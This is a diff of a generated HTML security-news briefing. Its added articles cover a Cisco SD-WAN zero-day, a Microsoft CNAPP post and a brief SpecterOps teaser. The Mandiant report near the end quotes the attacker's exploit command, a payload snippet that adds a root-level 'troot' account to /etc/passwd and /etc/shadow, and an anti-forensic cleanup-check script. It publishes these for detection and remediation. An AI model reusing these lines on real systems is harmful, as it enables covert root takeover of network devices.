@@ -59,34 +59,418 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-06-24</h1>
+        <h1>Security Briefing // 2026-06-25</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Cisco Unified CM Flaw Exploited After PoC Reveals File-Write Path to Root</button></li><li><button onclick="show('art-1')">Cisco Unified CM flaw CVE-2026-20230 now exploited in attacks</button></li><li><button onclick="show('art-2')">Scattered Spider Hackers Plead Guilty on Day 1 of Trial</button></li><li><button onclick="show('art-3')">LastPass confirms data breach in Klue supply chain attack</button></li><li><button onclick="show('art-4')">ShapedPlugin WordPress Pro Plugins Backdoored in Supply Chain Attack</button></li><li><button onclick="show('art-5')">AutoJack: How a single page can RCE the host running your AI agent</button></li><li><button onclick="show('art-6')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li><li><button onclick="show('art-7')">How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team</button></li><li><button onclick="show('art-8')">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
+            <ul><li><button onclick="show('art-0')">Cisco Catalyst SD-WAN Zero-Day CVE-2026-20245 Exploited to Gain Root Access</button></li><li><button onclick="show('art-1')">Mandiant reveals how Cisco SD-WAN zero-day attacks gained root access</button></li><li><button onclick="show('art-2')">CNAPP evolution: How Microsoft aligns with leading cloud risk management platforms</button></li><li><button onclick="show('art-3')">Disposable Tooling: Building LLM-Generated Mythic Agents from Prompt to Deployment</button></li><li><button onclick="show('art-4')">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager</button></li><li><button onclick="show('art-5')">Stealthy Mistic backdoor linked to ransomware access broker KongTuke</button></li><li><button onclick="show('art-6')">Cisco Unified CM Flaw Exploited After PoC Reveals File-Write Path to Root</button></li><li><button onclick="show('art-7')">Scattered Spider Hackers Plead Guilty on Day 1 of Trial</button></li><li><button onclick="show('art-8')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li><li><button onclick="show('art-9')">How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
-            <h2 class="article-title">Cisco Unified CM Flaw Exploited After PoC Reveals File-Write Path to Root</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/cisco-unified-cm-flaw-exploited-after.html" target="_blank">Original Link</a></p>
-            <div class="content-text">Threat actors have begun to exploit a recently disclosed critical security flaw impacting Cisco Unified Communications Manager (Unified CM) and Unified Communications Manager Session Management Edition (Unified CM SME).
-
-The vulnerability, tracked as CVE-2026-20230 (CVSS score: 8.6), is a case of improper input validation for specific HTTP requests that could allow an unauthenticated, remote
-
-[Full content could not be extracted. Visit source for details.]</div>
+            <h2 class="article-title">Cisco Catalyst SD-WAN Zero-Day CVE-2026-20245 Exploited to Gain Root Access</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/cisco-catalyst-sd-wan-zero-day-cve-2026.html" target="_blank">Original Link</a></p>
+            <div class="content-text">An unknown threat actor exploited a recently disclosed high-severity security flaw impacting Cisco Catalyst SD-WAN as a zero-day at least two months before it was publicly disclosed, according to new findings from Google-owned Mandiant.
+The vulnerability, tracked as [CVE-2026-20245](https://thehackernews.com/2026/06/cisco-catalyst-sd-wan-manager-cve-2026.html) (CVSS score: 7.8), allows an authenticated, local attacker to [execute arbitrary commands with elevated privileges](https://thehackernews.com/2026/06/cisa-adds-cisco-chrome-and-arista-flaws.html) by supplying a crafted file to the affected system by taking advantage of the device's insufficient validation of user-supplied input.
+Earlier this month, Cisco acknowledged that it became aware of exploitation of this vulnerability, adding that a malicious actor must have netadmin privileges on an affected system to pull off a successful attack.
+"Throughout the intrusion, to maintain operational security and avoid detection, the threat actor consistently employed anti-forensic techniques, selectively deleting and restoring system configuration files that were modified during their activities," Mandiant researchers Chester Sng, Pete Boonyakarn, and Logeswaran Nadarajan [said](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager).
+The incident, the tech giant's incident response and threat intelligence arm added, targeted an unspecified communications service provider to elevate a compromised admin account to full root-level access.
+Two distinct periods of unauthorized activity have been detected, one taking place between late 2025 and January 2026 and the other in March 2026. At this stage, it's unclear if these two events are connected and the work of the same threat actor.
+During the first wave, the victim is said to have experienced unauthorized peering connections that likely exploited one of two authentication bypass flaws in Cisco Catalyst SD-WAN controllers ([CVE-2026-20127](https://thehackernews.com/2026/02/cisco-sd-wan-zero-day-cve-2026-20127.html) or [CVE-2026-20182](https://thehackernews.com/2026/05/cisa-adds-cisco-sd-wan-cve-2026-20182.html)). It's worth noting that both the security vulnerabilities were undisclosed zero-days at that point.
+Then in March 2026, a second wave of rogue peering connections targeted a device running a newer software version that was patched against CVE-2026-20127. Cisco has since confirmed that these connections did not leverage CVE-2026-20182, raising the possibility that the attacker, who may or may not have been behind the previous unauthorized peering connections, relied on stolen certificates from a prior breach of the same device to obtain initial access.
+"The attacker then changed default admin credentials before exploiting CVE-2026-20245 as a zero-day via a malicious CSV file upload (evil_tenant.csv)," Mandiant said. "This exploit allowed them to escalate privileges and create a rogue user account (named 'troot') with full root-level shell control."
+The attackers have also been found to consistently cover their tracks by deleting files created by them, reversing configuration changes, and running scripts to ensure that no evidence was left behind and limit defenders' ability to assess the full extent of the compromise.
+"After changing the default admin password and exfiltrating the SD-WAN fabric configuration, the actor changed the password back to its original value so an administrator logging in would not notice anything was off," Austin Larsen, principal threat analyst at Google Threat Intelligence Group (GTIG), [said](https://www.linkedin.com/posts/austin-larsen_mandiant-part-of-google-cloud-just-published-activity-7475581120282001408-esUQ/).
+"They escalated to root through a malicious CSV upload, created a hidden "troot" account in /etc/passwd and /etc/shadow, then deleted every file they touched and ran a validation script to confirm their indicators were gone."
+Google pointed out that the activity once again highlights the "continuing trend" of bad actors weaponizing zero-days in edge devices like SD-WAN, as they lack the telemetry needed for deep forensic analysis, and a foothold in those systems can facilitate persistent visibility into internal traffic across the fabric.
+"Advanced adversaries continue to primarily target and exploit network devices and other systems that don't natively support EDR solutions," Charles Carmakal, chief technology officer of Mandiant Consulting, [said](https://www.linkedin.com/posts/charlescarmakal_0-day-exploitation-exploitation-of-at-activity-7475567485971496963-0SvI/) in a post on LinkedIn.
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-1" class="article-body">
-            <h2 class="article-title">Cisco Unified CM flaw CVE-2026-20230 now exploited in attacks</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/cisco-unified-cm-sme-flaw-cve-2026-20230-now-exploited-in-attacks/" target="_blank">Original Link</a></p>
-            <div class="content-text">A high-severity SSRF vulnerability, tracked as CVE-2026-20230, in Cisco Unified Communications Manager Server is now being exploited in attacks. [...]
+            <h2 class="article-title">Mandiant reveals how Cisco SD-WAN zero-day attacks gained root access</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/mandiant-reveals-how-cisco-sd-wan-zero-day-attacks-gained-root-access/" target="_blank">Original Link</a></p>
+            <div class="content-text">New details have been revealed on how hackers exploited a Cisco Catalyst SD-WAN vulnerability tracked as CVE-2026-20245 in zero-day attacks to create rogue root accounts on targeted devices.
+The [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx) vulnerability is a high-severity command injection flaw in Cisco Catalyst SD-WAN Manager (vManage), Controller (vSmart), and Validator (vBond) that allows authenticated attackers to execute arbitrary commands as root by uploading a crafted file.
+Cisco said the vulnerability stemmed from insufficient validation of user-supplied input and could be exploited by authenticated attackers with local access to affected devices.
+When Cisco disclosed the flaw earlier this month, the company warned that it had been [exploited in a limited number of attacks](https://www.bleepingcomputer.com/news/security/new-cisco-sd-wan-flaw-exploited-in-zero-day-attacks-to-gain-root/) but did not provide any details.
+Cisco only stated that successful exploitation allowed attackers to gain root privileges and that some incidents involved unauthorized configuration changes being pushed to edge devices.
+The company released security updates and urged customers to upgrade to fixed software versions, stating that no workarounds were available.
+New exploitation details emerge
+In a report published today, [Mandiant revealed](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager) that CVE-2026-20245 was exploited as a privilege-escalation vulnerability after attackers had already gained access to targeted SD-WAN devices.
+According to the researchers, the intrusion began with unauthorized SD-WAN peering connections observed on a service provider's infrastructure.
+Beginning in March 2026, the threat actor established new rogue peer connections and authenticated to affected SD-WAN Manager devices using the vmanage-admin
+account.
+Mandiant believes the rogue peering may have been created by exploiting previously disclosed Cisco SD-WAN authentication bypass zero-days, [CVE-2026-20127](https://www.bleepingcomputer.com/news/security/critical-cisco-sd-wan-bug-exploited-in-zero-day-attacks-since-2023/) and [CVE-2026-20182](https://www.bleepingcomputer.com/news/security/cisco-warns-of-new-critical-sd-wan-flaw-exploited-in-zero-day-attacks/), though the exact method remains unclear.
+After gaining access, the attackers changed the default admin account password, logged in to the SD-WAN Manager web interface, and extracted configuration information for edge devices, controllers, and SD-WAN templates.
+Mandiant says the attackers subsequently restored the admin account to its original password after completing their activity, likely to reduce detection.
+The researchers say the attackers then exploited CVE-2026-20245 through a tenant-upload feature in the SD-WAN command-line interface by uploading a malicious CSV file named "evil_tenant.csv."
+"[CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx), a vulnerability reported to Cisco by Mandiant, exists in the command-line interface (CLI) of Cisco Catalyst SD-WAN Controllers that could allow an authenticated, local attacker to execute arbitrary commands as root by supplying a crafted file to the affected system," explains Mandiant.
+Mandiant says the malicious payload first created backups of system configuration files, including /etc/passwd
+and /etc/shadow
+, before creating a new account named "troot
+" with root-level privileges.
+The attackers then used the Linux "su
+" command to switch from the compromised administrative account to the newly created root account, giving them full control over the device.
+Mandiant says the attackers heavily relied on anti-forensic tactics to evade detection.
+This includes backing up configuration files before modifying them and then restoring them after exploitation. They also cleaned up traces of exploitation by deleting the malicious CSV payload, removing temporary files created during the attack, and erasing evidence of the rogue root account.
+The researchers also observed the execution of a validation script to confirm that all traces of the compromise had been removed from the device.
+Mandiant says some rogue peering activity observed in March 2026 occurred on systems that were not vulnerable to any of the previously disclosed authentication-bypass flaws.
+Cisco told the researchers that the breach did not involve CVE-2026-20182 and said it was possible the attackers used certificates stolen during a previous compromise to regain access to devices.
+Mandiant has published indicators of compromise, attacker IP addresses, and guidance to help organizations determine whether they were compromised.
+Organizations should collect diagnostic data from SD-WAN devices, check for signs of unauthorized peering connections, and upgrade to the latest software releases if they have not already done so.
+[Test every layer before attackers do](https://hubs.li/Q04jQ9z40)
+Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen.
+The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection.
+[Get the whitepaper](https://hubs.li/Q04jQ9z40)
+Post a Comment Community Rules
+You need to login in order to post a comment
+Not a member yet? Register Now</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-2" class="article-body">
+            <h2 class="article-title">CNAPP evolution: How Microsoft aligns with leading cloud risk management platforms</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/06/24/cnapp-evolution-how-microsoft-aligns-with-leading-cloud-risk-management-platforms/" target="_blank">Original Link</a></p>
+            <div class="content-text">Cloud security is shifting from visibility to context-aware risk reduction, helping security teams understand which exposures matter most, prioritize what can be exploited, and reduce risk across the application lifecycle. As organizations continue to expand across multicloud environments, Kubernetes, APIs, and AI-powered workloads, security teams are overwhelmed with signals. The challenge is no longer identifying individual risks, but determining which combinations of vulnerabilities, identities, and data exposures are most critical to address at the source.
+[Frost & Sullivan’s 2026 Frost Radar™ for Cloud-Native Application Protection Platforms (CNAPP)](https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/bade/documents/products-and-services/en-us/security/Cloud-Native-Application-Protection-Platforms-2026-Microsoft.pdf) reflects this shift. The report highlights how CNAPP is evolving from a collection of posture and workload capabilities into a unified cloud risk operations platform—one that correlates signals across code, cloud, runtime, and SOC workflows to prioritize and reduce risk continuously. Within this evolving market, Microsoft is positioned among leading CNAPP vendors—reflecting alignment with where the category is heading.
+Why CNAPP is being redefined
+The Frost Radar makes a clear point: CNAPP is no longer about visibility or compliance—it is becoming an operational platform for reducing risk.
+Modern environments introduce complexity across:
+- Multicloud and hybrid infrastructure.
+- Rapid development and continuous deployment.
+- Containers, serverless, and APIs.
+- AI-powered workloads.
+This complexity exposes the limits of traditional tools.
+Organizations now require platforms that can:
+- Correlate posture, runtime, identity, and data signals.
+- Prioritize risk based on exploitability—not severity alone.
+- Integrate security across development and operations.
+- Support faster investigation and response.
+This is the shift: from detecting issues to operationalizing risk reduction across the application lifecycle.
+What distinguishes leading CNAPP platforms
+Frost evaluates CNAPP providers based on growth and innovation—but more importantly, on how effectively they help organizations manage risk.
+According to the report, five themes define the next generation of platforms:
+- Platform unification over point solutions.
+- Code-to-cloud-to-SOC integration.
+- Risk prioritization based on exploitability.
+- Correlation across identity, data, and application context.
+- Expansion into AI-powered workloads.
+These capabilities represent a shift from fragmented visibility to connected, contextual risk management.
+How Microsoft aligns with CNAPP’s next phase
+1. Correlating risk across identity, endpoints, data, and cloud
+Most security tools surface findings. Fewer connect them meaningfully. Modern attacks exploit the combination of misconfigurations, excessive permissions, and data exposure—not isolated issues. [Microsoft Defender for Cloud](https://www.microsoft.com/en-us/security/business/cloud-security/microsoft-defender-cloud) correlates posture findings with identity, data, and runtime signals—helping surface risks that are exploitable. A misconfigured storage resource on its own may not appear critical. But when combined with excessive access permissions and the presence of sensitive data, it can create a clear attack path.
+What this means: Security teams can prioritize real attack paths instead of individual findings, reducing alert fatigue and improving remediation speed and precision.
+2. Extending security from code to cloud to SOC
+Security must operate continuously across development, runtime, and operations.
+Defender for Cloud connects:
+- Code and infrastructure-as-code scanning.
+- Cloud posture and runtime protection.
+- Security operations and response workflows.
+A vulnerability identified in infrastructure-as-code before deployment can be tracked through to runtime—where it is validated against real-world behavior and surfaced in security operations if actively exploitable.
+What this means: Organizations move from fragmented workflows to continuous risk validation and response across the lifecycle.
+3. Reducing complexity across fragmented security workflows
+As environments scale, tool sprawl limits visibility and slows response. Microsoft delivers CNAPP capabilities as part of a connected platform—integrating posture management, workload protection, identity, data, and threat detection across multicloud environments. Instead of switching between separate tools, security teams can investigate a single incident across initial misconfiguration, runtime impact, and identity exposure, enabling a more connected experience.
+What this means: Security teams can investigate faster, prioritize risk more consistently, and reduce exposure across fragmented cloud environments.
+Where security leaders focus next
+The Frost Radar offers a signal for where cloud security is headed: toward platforms that connect context across cloud environments so teams can prioritize the risks most likely to be exploited and reduce exposure faster.
+Security leaders should now ask:
+- Can the platform correlate signals across identity, end points, data, cloud, and runtime?
+- Does it span the full code-to-cloud lifecycle?
+- Can it prioritize risk based on exploitability—not just severity?
+- Does it integrate with SOC workflows for faster response?
+- Can it scale across multicloud and AI environments?
+These are the capabilities that define the next generation of CNAPP.
+Bottom line
+[Frost & Sullivan’s 2026 CNAPP analysis](https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/bade/documents/products-and-services/en-us/security/Cloud-Native-Application-Protection-Platforms-2026-Microsoft.pdf) reinforces a clear shift: Cloud security is moving from fragmented visibility to unified, contextual risk management across the entire lifecycle. Microsoft’s position in the Frost Radar reflects this shift—bringing together posture, runtime, identity, end points, and data signals into a connected platform that helps organizations prioritize and reduce risk continuously.
+Learn more
+- Read
+[Frost & Sullivan’s 2026 Frost Radar™ for Cloud-Native Application Protection Platforms (CNAPP)](https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/bade/documents/products-and-services/en-us/security/Cloud-Native-Application-Protection-Platforms-2026-Microsoft.pdf)to see how leading vendors are evaluated—and how the category is shifting toward unified cloud risk operations platforms. - Explore
+[Microsoft cloud security solutions](https://www.microsoft.com/en-us/security/business/solutions/cloud-security)to see how unified posture management, risk prioritization, and protection across the application lifecycle can help reduce cloud risk.
+To learn more about Microsoft Security solutions, visit our [website.](https://www.microsoft.com/en-us/security/business) Bookmark the [Microsoft Security blog](https://www.microsoft.com/security/blog/) to keep up with our expert coverage on security matters. Also, follow us on LinkedIn ([Microsoft Security](https://www.linkedin.com/showcase/microsoft-security/)) and X ([@MSFTSecurity](https://twitter.com/@MSFTSecurity)) for the latest news and updates on cybersecurity.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-3" class="article-body">
+            <h2 class="article-title">Disposable Tooling: Building LLM-Generated Mythic Agents from Prompt to Deployment</h2>
+            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/06/24/disposable-tooling-building-llm-generated-mythic-agents-from-prompt-to-deployment/" target="_blank">Original Link</a></p>
+            <div class="content-text"><p>An area I’ve been very interested in exploring over the past several months is the generation of what I have been calling “disposable tooling”. With the development space now discussing the reduced cost of writing code, the idea is to also explore how offensive tooling can be brought closer to the paradigm that appeared when [&#8230;]</p>
+<p>The post <a href="https://specterops.io/blog/2026/06/24/disposable-tooling-building-llm-generated-mythic-agents-from-prompt-to-deployment/">Disposable Tooling: Building LLM-Generated Mythic Agents from Prompt to Deployment</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
 
 [Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-2" class="article-body">
+        <div id="art-4" class="article-body">
+            <h2 class="article-title">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager</h2>
+            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager/" target="_blank">Original Link</a></p>
+            <div class="content-text">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager
+Mandiant
+Written by: Chester Sng, Pete Boonyakarn, Logeswaran Nadarajan
+Introduction
+In early 2026, Mandiant identified a threat actor targeting SD-WAN infrastructure at a service provider. After gaining initial access, the threat actor exploited a zero-day vulnerability ([CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)) in Cisco Catalyst SD-WAN to escalate privileges from a compromised administrative account to root-level access.
+The vulnerability stems from the device’s file upload feature lacking the ability to properly filter malicious data.
+Throughout the intrusion, to maintain operational security and avoid detection, the threat actor consistently employed anti-forensic techniques, selectively deleting and restoring system configuration files that were modified during their activities.
+Key Observations
+-
+Rogue Peering and Credential Manipulation: In March 2026, a threat actor established initial access via unauthorized peering connections to facilitate Secure Shell (SSH) access. The threat actor used that access to manipulate default account passwords to evade detection.
+-
+Exploitation of CVE-2026-20245: Subsequently, the attacker leveraged a zero-day privilege escalation vulnerability (now tracked as CVE-2026-20245) in Cisco Catalyst SD-WAN Manager to gain root-level access via a malicious CSV upload.
+-
+Extensive Anti-Forensic Cleanup: The threat actor deleted malicious files, reverted configuration changes, and executed a validation script to ensure indicators are purged.
+What is SD-WAN?
+Traditional Wide Area Networks (WANs) rely heavily on physical, proprietary hardware routers to direct traffic. This model is often rigid, complex to scale, and struggles to handle the demands of modern cloud computing.
+Software-Defined Wide Area Network (SD-WAN) solves this by decoupling the network’s management and control logic from the underlying physical hardware. Instead of configuring individual routers one by one, a centralized software controller is used to orchestrate the entire network from a single dashboard. SD-WANs are typically used by highly distributed organizations, such as banks, retail corporations, technology services, and healthcare providers, to securely connect multiple remote branch locations directly to central cloud services.
+What is Peering?
+Within an SD-WAN fabric, peering is the logical process of establishing a trusted, authenticated relationship between distinct network components, such as edge routers, regional hubs, and central controllers.
+Before any data can be securely transmitted across the network fabric, these devices must perform a digital handshake. During the peering phase, devices mutually authenticate each other using cryptographic certificates. Once identity and trust are verified, they exchange underlying routing tables and automatically build secure tunnels to facilitate safe data transport.
+Additional Vulnerabilities in Cisco Catalyst SD-WAN Controllers
+[CVE-2026-20127](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa-EHchtZk) and [CVE-2026-20182](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa2-v69WY2SW) are critical vulnerabilities recently disclosed by Cisco that affect the peering authentication mechanism for Cisco Catalyst SD-WAN controllers. Both vulnerabilities could allow an unauthenticated, remote attacker to bypass authentication and obtain administrative privileges.
+Intrusion Campaign Overview
+Initial Access Via Rogue Peering Connections
+From late 2025 to January 2026, Mandiant observed multiple unauthorized peering connections to the victim’s SD-WAN Manager devices. It is possible that these connections occurred due to the exploitation of CVE-2026-20127 or CVE-2026-20182 as the vulnerabilities were not disclosed, and patches were not available during this period.
+Beginning in March 2026, further unauthorized peering connections were seen on a device running a software version unaffected by CVE-2026-20127. However, Cisco confirmed that these connections did not leverage CVE-2026-20182 either, and could instead be using stolen certificate material from a previous compromise of the same device.
+It is unclear if the same threat actor was responsible for the late 2025 to January 2026 and March 2026 rogue peering activity.
+Successful Authentications By Altering The Admin Account Password
+In March 2026, the threat actor established new rogue peer connections and successfully authenticated to the SD-WAN Manager device via SSH using the vmanage-admin
+account on the same victim devices.
+Once authenticated via SSH, the threat actor executed commands to change the password of the default admin
+account. The threat actor authenticated directly to the SD-WAN Manager web application interface using the admin
+account and exfiltrated configurations of the SD-WAN fabric.
+[2026-03-07T01:31:48.464Z]"POST /j_security_check HTTP/1.1" 200 - 31 0 1288 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:49.017Z] "GET /dataservice/system/device/vedges HTTP/1.1" 200 - 0 10114 127 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:50.017Z] "GET /dataservice/system/device/controllers HTTP/1.1" 200 - 0 15815 100 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:51.925Z] "GET /dataservice/template/config/attached/<Device ID> HTTP/1.1" 200 - 0 3732 18 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:52.493Z] "GET /dataservice/template/config/running/<Device ID> HTTP/1.1" 400 - 0 134 19 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
+<...>
+Figure 1: Threat actor authentication and configuration extraction
+The threat actor subsequently used their active vmanage-admin
+session to change the password of the admin
+account back to its original state before terminating their active session. This activity was likely performed to reduce the probability of detection by an administrator trying to log into the device during day-to-day operations.
+The vmanage-admin
+and admin
+accounts are default accounts on Cisco Catalyst SD-WAN controllers that have different privileges, but [neither possesses root shell access](https://www.cisco.com/c/en/us/td/docs/routers/sdwan/17-x/systems-interfaces/systems-interfaces-guide-17-x/users-and-access.html).
+Exploitation of CVE-2026-20245 to Escalate Privileges
+After establishing an SSH session with the admin
+account, the threat actor exploited CVE-2026-20245 by executing the following command to upload a file named evil_tenant.csv
+:
+request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
+Figure 2: Malicious file upload
+[CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx), a vulnerability reported to Cisco by Mandiant, exists in the command-line interface (CLI) of Cisco Catalyst SD-WAN Controllers that could allow an authenticated, local attacker to execute arbitrary commands as root by supplying a crafted file to the affected system.
+The evil_tenant.csv
+file contains the exploit payload. The following code block (Figure 3) shows a snippet of the exploit which attempts to append malicious entries to the system's /etc/passwd
+and /etc/shadow
+files.
+if [ -e /usr/share/viptela/vbond_vsmart_tenant_list ] && grep -q '<redacted>' /usr/share/viptela/vbond_vsmart_tenant_list 2>/dev/null; then
+echo absent > /home/admin/.orig_vbond_vsmart_tenant_list.state;
+elif [ -e /usr/share/viptela/vbond_vsmart_tenant_list ]; then
+echo present > /home/admin/.orig_vbond_vsmart_tenant_list.state;
+cp -a /usr/share/viptela/vbond_vsmart_tenant_list /home/admin/.orig_vbond_vsmart_tenant_list;
+else
+echo absent > /home/admin/.orig_vbond_vsmart_tenant_list.state;
+fi;
+cp -a /etc/passwd /home/admin/.orig_passwd;
+cp -a /etc/shadow /home/admin/.orig_shadow;
+grep -q '^troot:' /etc/passwd || echo 'troot:x:0:0:root:/root:/bin/bash' >> /etc/passwd;
+grep -q '^troot:' /etc/shadow || echo 'troot:<redacted>:19000:0:99999:7:::' >> /etc/shadow
+Figure 3: Appending malicious entries
+Through this command, the threat actor achieved the following:
+-
+Backed up the original
+vbond_vsmart_tenant_list
+configuration file, which would have been overwritten by the contents ofevil_tenant.csv
+during the exploit. This backup was likely created to allow the actor to restore the file later, ensuring the SD-WAN Manager device did not load an invalid configuration that might alert administrators. -
+Created backups of the original
+/etc/passwd
+and/etc/shadow
+files. -
+Created a user account named
+troot
+with full root privileges.
+Mandiant subsequently observed the threat actor accessing this new troot
+account from the admin
+account via the su
+(substitute user) command.
+Anti-Forensic Techniques
+Mandiant identified that the threat actor deleted all files they created, including evil_tenant.csv
+, and restored any system configurations they modified. These deletion and modifications were done to minimize their forensic footprint.
+In addition to this, Mandiant also observed execution of a validation script, which checks if indicators of the threat actor's activities are removed.
+for f in /home/admin/evil_tenant.csv /home/admin/.orig_vbond_vsmart_tenant_list /home/admin/.orig_vbond_vsmart_tenant_list.state /home/admin/.orig_passwd /home/admin/.orig_shadow;
+do if [ -e "$f" ];
+then echo PRESENT:$f; ls -ld "$f";
+else echo ABSENT:$f;
+fi;
+done;
+if grep -q '^troot:' /etc/passwd;
+then echo PRESENT:/etc/passwd:troot;
+else echo ABSENT:/etc/passwd:troot;
+fi;
+if [ -e /usr/share/viptela/vbond_vsmart_tenant_list ];
+then echo PRESENT:/usr/share/viptela/vbond_vsmart_tenant_list; ls -ld /usr/share/viptela/vbond_vsmart_tenant_list;
+else echo ABSENT:/usr/share/viptela/vbond_vsmart_tenant_list;
+fi
+Figure 4: Validation script
+This script checks for the presence of the following:
+-
+Threat actor-created files in
+/home/admin.
+-
+troot
+account in thepasswd
+andshadow
+files. -
+vbond_vsmart_tenant_list
+, and if it exists, inspect information about the file. This is likely to check if the original file was restored.
+Outlook and Implications
+This campaign underscores the living off the edge paradigm, where threat actors prioritize the compromise of network appliances to bypass traditional security perimeters. As organizations increasingly adopt software-defined networking, the orchestrators managing these environments become primary targets. These devices offer a black box environment for threat actors: they often lack the telemetry required for deep forensic analysis, and their role as a central control plane provides a stealthy platform for persistent, wide-scale access to internal enterprise traffic. For state-sponsored actors, the ability to exploit zero-day vulnerabilities in these platforms remains a premier vector for long-term strategic intelligence collection. Google Threat Intelligence Group (GTIG) has [closely](https://cloud.google.com/blog/topics/threat-intelligence/zero-days-exploited-2022) [tracked](https://cloud.google.com/blog/topics/threat-intelligence/2023-zero-day-trends) [and](https://cloud.google.com/blog/topics/threat-intelligence/2024-zero-day-trends) [reported](https://cloud.google.com/blog/topics/threat-intelligence/2025-zero-day-review) on increased zero-day exploitation of edge devices over the past several years.
+Remediation and Hardening
+-
+Perform IOC Sweep / Threat Hunting: Collect logs and diagnostic data from SD-WAN devices by executing
+request admin-tech
+command on all control-plane components. Scan these collections for known IOCs and execute threat hunts focused on the TTPs identified in the Detections and Hunting section of this blog post. If true positive hits are observed, perform a full investigation. -
+Manual Remediation Support: As per Cisco’s guidance, any confirmed indicators of compromise or suspicious activity should be forwarded to
+[Cisco Technical Assistance Center (TAC)](https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html)for comprehensive review and remediation assistance. -
+Prioritize Immediate Patching and Upgrades: Organizations must prioritize upgrading Cisco Catalyst SD-WAN Manager to fixed software releases, specifically versions 20.9.9.2, 20.12.7.2, 20.15.4.5, 20.15.5.3, 20.18.3.1, 26.1.1.2, or later, to remediate
+[CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). -
+Implement Cisco Catalyst SD-WAN Hardening and Logging Guidelines: Organizations should follow the comprehensive security best practices and configuration standards detailed in the
+[Cisco Catalyst SD-WAN Hardening Guide](https://sec.cloudapps.cisco.com/security/center/resources/Cisco-Catalyst-SD-WAN-HardeningGuide). This guide provides a robust defense-in-depth framework for securing all SD-WAN components including the management, control, and data planes against unauthorized access.
+Indicators of Compromise (IOCs)
+To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a free [GTI Collection](https://www.virustotal.com/gui/collection/d966161b93100fb8905b9b81bd03e57bbc93f21534acee88999e77798e913d5b/summary) for registered users.
+Network Indicators
+File Indicators
